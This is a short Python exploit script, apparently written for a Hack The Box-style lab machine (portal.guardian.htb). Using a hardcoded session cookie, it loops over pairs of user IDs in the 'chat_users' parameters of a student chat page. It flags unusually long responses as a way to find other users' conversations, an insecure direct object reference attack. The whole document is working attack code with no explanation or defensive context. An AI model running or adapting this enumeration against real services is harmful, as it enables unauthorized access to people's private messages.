import requests 

target_url = "http://portal.guardian.htb/student/chat.php"
headers  = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                        "Cookie": "PHPSESSID=1tiurgc1tbd0nsu1rdl5ec5mh1"}
for number1 in range(1, 21):
    for number2 in range(1, 21):
        params = {
                "chat_users[0]": f"{number1}",
                "chat_users[1]": f"{number2}"
            }

        try:
            response = requests.get(target_url, headers=headers, params=params, timeout=3)
            if len(response.text) > 6100:
                print(f"[+]  Found potential match IDS! -> {number1}, {number2}| Length: {len(response.text)}")
                print(response.url)
        except requests.exceptions.RequestException:
            pass
#print(response1.text)

